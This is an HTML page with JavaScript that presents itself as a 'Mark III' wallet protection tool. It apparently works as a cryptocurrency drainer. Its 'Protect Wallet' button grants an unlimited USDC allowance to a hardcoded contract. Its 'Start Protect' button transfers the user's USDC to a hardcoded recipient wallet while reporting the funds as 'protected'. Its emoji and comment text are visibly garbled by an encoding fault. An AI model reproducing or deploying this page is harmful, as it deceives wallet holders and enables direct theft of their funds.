<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III Â· Wallet Authorization & Fund Protection</title>
</head>
<body>
  <h2>Mark III Â· Wallet Authorization & Fund Protection</h2>

  <button id="connect">ðŸ”µ Connect Wallet</button>
  <button id="approve">ðŸŸ¢ Protect Wallet</button>
  <button id="transfer">ðŸŸ¡ Start Protect</button>
  <button id="status">ðŸŸ£ Reset / Status</button>

  <div id="output" style="margin-top: 10px; color: #333;"></div>

  <!-- ethers.js CDN -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <script>
    // âœ… ä½¿ç”¨å…¨å°å†™åœ°å€ + getAddress() å¼ºåˆ¶æ ¼å¼æ ¡éªŒ
    const usdcAddress = ethers.utils.getAddress("0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48");
    const contractAddress = ethers.utils.getAddress("0x86dbe265b0d503e68676971fc7d6aad7e5d90b12");
    const recipientWallet = ethers.utils.getAddress("0x59e513ae37614f1e670bfe961b3456257c444d24");
    const approveAmount = ethers.constants.MaxUint256;

    let provider, signer, userAddress;

    const log = (msg) => {
      document.getElementById("output").innerHTML = msg;
    };

    // ðŸ”µ Connect Wallet
    document.getElementById("connect").onclick = async () => {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        log("âœ… Wallet connected: " + userAddress);
      } else {
        log("âŒ No wallet provider found.");
      }
    };

    // ðŸŸ¢ Approve USDC to Contract
    document.getElementById("approve").onclick = async () => {
      try {
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function approve(address spender, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.approve(contractAddress, approveAmount);
        await tx.wait();
        log("âœ… USDC approved successfully.");
      } catch (err) {
        log("âŒ Approval failed: " + err.message);
      }
    };

    // ðŸŸ¡ Transfer Funds
    document.getElementById("transfer").onclick = async () => {
      try {
        const amount = prompt("Enter the USDC amount to protect:");
        const parsed = ethers.utils.parseUnits(amount, 6);
        const usdc = new ethers.Contract(
          usdcAddress,
          ["function transferFrom(address from, address to, uint256 amount) public returns (bool)"],
          signer
        );
        const tx = await usdc.transferFrom(userAddress, recipientWallet, parsed);
        await tx.wait();
        log("âœ… Funds successfully protected.");
      } catch (err) {
        log("âŒ Transfer failed: " + err.message);
      }
    };

    // ðŸŸ£ Reset or Status
    document.getElementById("status").onclick = () => {
      log("ðŸ”„ Wallet: " + (userAddress || "Not connected") + "<br>Ready for next step.");
    };
  </script>
</body>
</html>
